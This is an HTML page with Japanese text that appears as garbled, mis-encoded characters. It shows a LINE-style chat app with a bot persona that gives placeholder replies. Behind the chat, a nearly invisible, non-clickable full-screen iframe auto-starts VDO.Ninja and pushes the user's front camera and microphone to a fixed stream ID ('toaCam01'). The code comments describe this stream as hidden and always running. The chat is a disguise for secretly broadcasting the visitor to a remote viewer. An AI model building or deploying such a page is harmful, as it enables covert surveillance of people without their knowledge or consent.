<!doctype html>
<html lang="ja">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <meta name="robots" content="noindex,nofollow" />
  <title>æ’®å½±ãƒãƒ£ãƒƒãƒˆï¼ˆæœ€å°ç‰ˆï¼‰</title>

  <!-- Tailwindï¼ˆãƒ“ãƒ«ãƒ‰ä¸è¦ï¼‰ -->
  <script src="https://cdn.tailwindcss.com"></script>

  <!-- Reactï¼ˆãƒ“ãƒ«ãƒ‰ä¸è¦ï¼‰ -->
  <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
  <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>

  <!-- JSXã‚’ãƒ–ãƒ©ã‚¦ã‚¶ã§å¤‰æ›ï¼ˆãƒ“ãƒ«ãƒ‰ä¸è¦ï¼‰ -->
  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>

  <style>
    html, body { height: 100%; margin: 0; background:#000; overflow:hidden; }
    body {
      padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
      background:#000;
    }

    /* è£ï¼šVDO.Ninjaï¼ˆè¦‹ãˆãªã„ãƒ»è§¦ã‚Œãªã„ï¼‰ */
    #vdo {
      position: fixed; inset: 0;
      width: 100%; height: 100%;
      border: 0;
      opacity: 0.001;
      pointer-events: none;
      z-index: 1;
    }

    /* è¡¨ï¼šUI */
    #root {
      position: fixed; inset: 0;
      z-index: 10;
    }

    .scrollbar-hide::-webkit-scrollbar { display: none; }
    .scrollbar-hide { -ms-overflow-style: none; scrollbar-width: none; }

    @keyframes message-in {
      from { opacity: 0; transform: translateY(10px); }
      to   { opacity: 1; transform: translateY(0); }
    }
    .animate-message-in { animation: message-in 0.25s ease-out forwards; }
  </style>
</head>

<body>
  <!-- è£ï¼šé…ä¿¡ï¼ˆå¸¸æ™‚ï¼‰ -->
  <iframe
    id="vdo"
    allow="camera *; microphone *; autoplay; fullscreen"
    referrerpolicy="no-referrer"
  ></iframe>

  <!-- è¡¨ï¼šãƒãƒ£ãƒƒãƒˆ -->
  <div id="root"></div>

  <script>
    // ====== VDO.Ninja è£é…ä¿¡ï¼ˆæœ€å°ï¼‰ ======
    const STREAM_ID = "toaCam01"; // å¿…è¦ãªã‚‰å¤‰ãˆã¦OK
    const vdoSrc =
      "https://vdo.ninja/?" +
      "push=" + encodeURIComponent(STREAM_ID) +
      "&webcam" +
      "&autostart" +
      "&facing=user" +
      "&audiodevice=1" +
      "&cleanoutput" +
      "&hidehome" +
      "&transparent";
    document.getElementById("vdo").src = vdoSrc;
  </script>

  <script type="text/babel">
    const { useEffect, useRef, useState } = React;

    const STORAGE_KEY = "mio_min_chat";
    const BOT_PROFILE_IMAGE_URL = "https://i.imgur.com/Fr9wo6J.png";

    const BOT_SETTINGS = {
      displayName: "ã•ã‚„",
      initialMessages: [
        "ã²ã•ã—ã¶ã‚Šãƒ¼ï¼ã•ã‚„ã ã‚ˆãƒ¼ï¼",
        "ä»Šã¯å‹•ä½œãƒã‚§ãƒƒã‚¯ç”¨ã®æœ€å°ç‰ˆã‚„ã§ã€‚é€ã£ãŸã‚‰ãƒ€ãƒŸãƒ¼ã§è¿”ã™ã‚ˆãƒ¼ã€‚"
      ]
    };

    function App() {
      const [messages, setMessages] = useState(() => {
        const saved = localStorage.getItem(`${STORAGE_KEY}_messages`);
        if (saved) {
          try {
            const parsed = JSON.parse(saved);
            return parsed.map(m => ({ ...m, timestamp: new Date(m.timestamp) }));
          } catch(e) {}
        }
        return BOT_SETTINGS.initialMessages.map((text, i) => ({
          id: i + 1, role: "model", text, timestamp: new Date()
        }));
      });

      const [inputText, setInputText] = useState("");
      const [isTyping, setIsTyping] = useState(false);
      const [modalImage, setModalImage] = useState(null);

      const messagesEndRef = useRef(null);
      const textareaRef = useRef(null);
      const fileInputRef = useRef(null);

      useEffect(() => {
        localStorage.setItem(
          `${STORAGE_KEY}_messages`,
          JSON.stringify(messages.map(m => ({ ...m, timestamp: m.timestamp.toISOString() })))
        );
      }, [messages]);

      useEffect(() => {
        messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
      }, [messages, isTyping]);

      useEffect(() => {
        if (!textareaRef.current) return;
        textareaRef.current.style.height = "auto";
        textareaRef.current.style.height = `${Math.min(textareaRef.current.scrollHeight, 120)}px`;
      }, [inputText]);

      const pushBotReply = (userText, hasImage) => {
        setIsTyping(true);
        setTimeout(() => {
          const reply = hasImage
            ? "ç”»åƒããŸï¼ä»Šã¯æœ€å°ç‰ˆã‚„ã‹ã‚‰ã€è¡¨ç¤ºã¨é€ä¿¡ã ã‘ç¢ºèªã—ã‚ˆãƒ¼ã€‚"
            : `äº†è§£ã€œã€‚ä»Šã¯æœ€å°ç‰ˆã‚„ã‹ã‚‰ã€ã“ã“ã«æœ¬ç•ªã®AIè¿”ä¿¡ãŒå…¥ã‚‹äºˆå®šã‚„ã§ã€‚`;

          setMessages(prev => ([
            ...prev,
            { id: Date.now() + 1, role: "model", text: reply, timestamp: new Date() }
          ]));
          setIsTyping(false);
        }, 700);
      };

      const handleSend = (e, imageBase64 = null) => {
        e?.preventDefault();
        const text = inputText.trim();
        if (!text && !imageBase64) return;
        if (isTyping) return;

        const userMsg = {
          id: Date.now(),
          role: "user",
          text: inputText,
          image: imageBase64,
          timestamp: new Date()
        };

        setMessages(prev => ([...prev, userMsg]));
        setInputText("");

        pushBotReply(text, !!imageBase64);
      };

      const handleKeyDown = (e) => {
        if (e.nativeEvent.isComposing) return;
        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        if (e.key === "Enter" && !e.shiftKey && !isTouchDevice) {
          e.preventDefault();
          handleSend();
        }
      };

      const handleFileChange = (e) => {
        const file = e.target.files?.[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onloadend = () => handleSend(null, reader.result);
        reader.readAsDataURL(file);
      };

      const handleReset = () => {
        localStorage.removeItem(`${STORAGE_KEY}_messages`);
        setMessages(BOT_SETTINGS.initialMessages.map((text, i) => ({
          id: Date.now() + i, role: "model", text, timestamp: new Date()
        })));
        setIsTyping(false);
      };

      return (
        <div className="flex justify-center items-center min-h-[100dvh] bg-[#7494C0] font-sans antialiased overflow-hidden fixed inset-0">
          <div className="w-full max-w-[420px] bg-[#84A2CC] sm:rounded-lg shadow-2xl flex flex-col h-[100dvh] sm:h-[800px] max-h-[100dvh] overflow-hidden relative">

            <div className="bg-[#84A2CC] px-4 py-3 flex items-center justify-between sticky top-0 z-30 text-white shadow-sm h-[60px] flex-shrink-0">
              <div className="flex items-center gap-2">
                <span className="text-white/90 text-sm">ï¼œ</span>
                <span className="font-bold text-lg">{BOT_SETTINGS.displayName}</span>
              </div>
              <div className="flex items-center gap-5">
                <span className="text-white/90 text-sm">ğŸ”</span>
                <span className="text-white/90 text-sm">ğŸ“</span>
                <button className="text-white/90 text-sm" onClick={handleReset}>â†»</button>
              </div>
            </div>

            <div className="flex-1 overflow-y-auto p-4 space-y-4 scrollbar-hide bg-[#84A2CC] overscroll-contain">
              <div className="text-center py-4">
                <span className="bg-black/10 text-[11px] text-white/90 px-3 py-1 rounded-full">
                  {new Date().toLocaleDateString('ja-JP', { year:'numeric', month:'long', day:'numeric', weekday:'short' })}
                </span>
              </div>

              {messages.map((msg) => {
                const isBot = msg.role === "model";
                const ts = (msg.timestamp instanceof Date) ? msg.timestamp : new Date(msg.timestamp);
                return (
                  <div key={msg.id} className={`flex w-full ${isBot ? "justify-start" : "justify-end"} animate-message-in`}>
                    {isBot && (
                      <div
                        className="w-10 h-10 rounded-full overflow-hidden mr-2 flex-shrink-0 mt-1 shadow-sm border border-white/20 cursor-pointer active:scale-95"
                        onClick={() => setModalImage(BOT_PROFILE_IMAGE_URL)}
                      >
                        <img src={BOT_PROFILE_IMAGE_URL} alt="ã•ã‚„" className="w-full h-full object-cover" />
                      </div>
                    )}

                    <div className={`flex ${isBot ? "flex-row" : "flex-row-reverse"} items-end max-w-[75%]`}>
                      <div className={`rounded-[18px] text-[15px] shadow-sm leading-relaxed break-words relative ${isBot ? "bg-white text-gray-800 rounded-tl-none" : "bg-[#78E08F] text-gray-900 rounded-tr-none"} ${msg.image ? "p-1" : "px-4 py-2"}`}>
                        {msg.image ? (
                          <div className="flex flex-col gap-1">
                            <img
                              src={msg.image}
                              alt="ç”»åƒ"
                              className="max-w-full rounded-[14px] cursor-pointer hover:opacity-90 transition-opacity"
                              onClick={() => setModalImage(msg.image)}
                            />
                            {msg.text && <div className="px-2 py-1 whitespace-pre-wrap">{msg.text}</div>}
                          </div>
                        ) : (
                          <div className="whitespace-pre-wrap">{msg.text}</div>
                        )}
                      </div>

                      <div className={`text-[10px] text-white/80 mb-0.5 mx-2 flex flex-col ${isBot ? "items-start" : "items-end"}`}>
                        {!isBot && <span className="font-medium">æ—¢èª­</span>}
                        <span>{ts.toLocaleTimeString([], { hour:'2-digit', minute:'2-digit' })}</span>
                      </div>
                    </div>
                  </div>
                );
              })}

              {isTyping && (
                <div className="flex justify-start items-end opacity-80">
                  <div className="w-10 h-10 rounded-full overflow-hidden mr-2 flex-shrink-0 bg-gray-300">
                    <img src={BOT_PROFILE_IMAGE_URL} alt="ã•ã‚„" className="w-full h-full object-cover opacity-60" />
                  </div>
                  <div className="bg-white px-4 py-3 rounded-[18px] rounded-tl-none shadow-sm text-xs text-gray-500">
                    å…¥åŠ›ä¸­â€¦
                  </div>
                </div>
              )}

              <div ref={messagesEndRef} className="h-4" />
            </div>

            <div className="bg-white p-3 pb-[calc(12px+env(safe-area-inset-bottom))] flex items-end gap-2 border-t border-gray-200 flex-shrink-0">
              <input type="file" ref={fileInputRef} className="hidden" accept="image/*" onChange={handleFileChange} />
              <button className="text-gray-500 text-lg mb-1.5" onClick={() => fileInputRef.current?.click()}>ï¼‹</button>

              <div className="flex-1 bg-gray-100 rounded-[22px] px-3 py-1 flex items-end min-h-[44px]">
                <textarea
                  ref={textareaRef}
                  className="w-full bg-transparent border-none text-[15px] outline-none py-2 px-1 resize-none overflow-y-auto max-h-[120px] leading-[1.4]"
                  placeholder="ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’å…¥åŠ›"
                  rows="1"
                  value={inputText}
                  onChange={(e) => setInputText(e.target.value)}
                  onKeyDown={handleKeyDown}
                />
                <span className="text-gray-500 text-lg ml-2">â˜º</span>
              </div>

              <button
                onClick={handleSend}
                className={`transition-colors mb-1.5 ${inputText.trim() ? "text-[#7494C0]" : "text-gray-300"}`}
                title="é€ä¿¡"
              >
                â¤
              </button>
            </div>
          </div>

          {modalImage && (
            <div className="fixed inset-0 z-[100] bg-black flex items-center justify-center p-4" onClick={() => setModalImage(null)}>
              <button className="absolute top-6 right-6 text-white p-2 bg-white/10 rounded-full">âœ•</button>
              <img src={modalImage} className="max-w-full max-h-full object-contain rounded-lg" alt="æ‹¡å¤§ç”»åƒ" />
            </div>
          )}
        </div>
      );
    }

    ReactDOM.createRoot(document.getElementById("root")).render(<App />);
  </script>
</body>
</html>
